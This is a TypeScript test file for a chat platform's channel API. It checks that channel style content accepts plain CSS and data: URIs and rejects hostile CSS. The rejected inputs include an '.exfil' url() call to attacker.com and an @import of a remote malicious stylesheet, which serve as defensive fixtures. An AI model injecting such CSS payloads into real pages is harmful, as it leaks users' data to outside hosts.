import test from "node:test";
import assert from "node:assert/strict";
import { buildApp } from "../app.js";
import { config } from "../config.js";
import { createSessionToken } from "../auth/session.js";
import { initDb, pool } from "../db/client.js";
import { upsertIdentityMapping } from "../services/identity-service.js";

config.discordBridge.mockMode = true;

async function resetDb(): Promise<void> {
  if (!pool) return;
  await pool.query("begin");
  try {
    await pool.query("delete from room_acl_status");
    await pool.query("delete from chat_messages");
    await pool.query("delete from channels");
    await pool.query("delete from categories");
    await pool.query("delete from servers");
    await pool.query("delete from hubs");
    await pool.query("delete from identity_mappings");
    await pool.query("delete from idempotency_keys");
    await pool.query(
      "update platform_settings set bootstrap_completed_at = null, bootstrap_admin_user_id = null, bootstrap_hub_id = null, default_server_id = null, default_channel_id = null where id = 'global'"
    );
    await pool.query("commit");
  } catch (error) {
    await pool.query("rollback");
    throw error;
  }
}

function createAuthCookie(input: {
  productUserId: string;
  provider?: string;
  oidcSubject?: string;
}): string {
  const token = createSessionToken({
    productUserId: input.productUserId,
    provider: input.provider ?? "dev",
    oidcSubject: input.oidcSubject ?? `sub_${input.productUserId}`,
    expiresAt: Date.now() + 60 * 60 * 1000
  });
  return `skerry_session=${token}`;
}

async function bootstrap(app: Awaited<ReturnType<typeof buildApp>>) {
  const adminIdentity = await upsertIdentityMapping({
    provider: "dev",
    oidcSubject: "chan_admin",
    email: "chan-admin@dev.local",
    preferredUsername: "chan-admin",
    avatarUrl: null
  });
  const adminCookie = createAuthCookie({
    productUserId: adminIdentity.productUserId,
  });

  const bsRes = await app.inject({
    method: "POST",
    url: "/auth/bootstrap-admin",
    headers: { cookie: adminCookie },
    payload: { setupToken: config.setupBootstrapToken, hubName: "Channel CRUD Hub" }
  });
  assert.equal(bsRes.statusCode, 201);
  const { defaultServerId } = bsRes.json() as { defaultServerId: string };

  return { adminIdentity, adminCookie, defaultServerId };
}

test("channel management with styleContent and CSS safety", async (t) => {
  if (!pool) { t.skip("DATABASE_URL not configured."); return; }
  if (!config.setupBootstrapToken) { t.skip("SETUP_BOOTSTRAP_TOKEN not configured."); return; }

  await initDb();
  await resetDb();
  const app = await buildApp();

  try {
    const { adminCookie, defaultServerId } = await bootstrap(app);

    // 1. Create channel with styleContent
    const createRes = await app.inject({
      method: "POST",
      url: "/v1/channels",
      headers: { cookie: adminCookie },
      payload: {
        serverId: defaultServerId,
        name: "styled-landing",
        type: "landing",
        styleContent: ".hero { color: cyan; }"
      }
    });
    assert.equal(createRes.statusCode, 201);
    const channel = createRes.json();
    assert.equal(channel.styleContent, ".hero { color: cyan; }");

    // 2. Update channel with data: URI (allowed)
    const updateRes = await app.inject({
      method: "PATCH",
      url: `/v1/channels/${channel.id}`,
      headers: { cookie: adminCookie },
      payload: {
        serverId: defaultServerId,
        styleContent: ".icon { background: url('data:image/png;base64,AAA'); }"
      }
    });
    assert.equal(updateRes.statusCode, 200);
    assert.ok(updateRes.json().styleContent.includes("data:image/png"));

    // 3. Attempt update with external url() (forbidden)
    const dangerousRes = await app.inject({
      method: "PATCH",
      url: `/v1/channels/${channel.id}`,
      headers: { cookie: adminCookie },
      payload: {
        serverId: defaultServerId,
        styleContent: ".exfil { background: url('https://attacker.com/leak'); }"
      }
    });
    // Expected to fail due to validateChannelStyle throwing
    assert.notEqual(dangerousRes.statusCode, 200);

    // 4. Attempt update with @import (forbidden)
    const importRes = await app.inject({
      method: "PATCH",
      url: `/v1/channels/${channel.id}`,
      headers: { cookie: adminCookie },
      payload: {
        serverId: defaultServerId,
        styleContent: "@import url('https://attacker.com/malicious.css');"
      }
    });
    assert.notEqual(importRes.statusCode, 200);

  } finally {
    await app.close();
  }
});
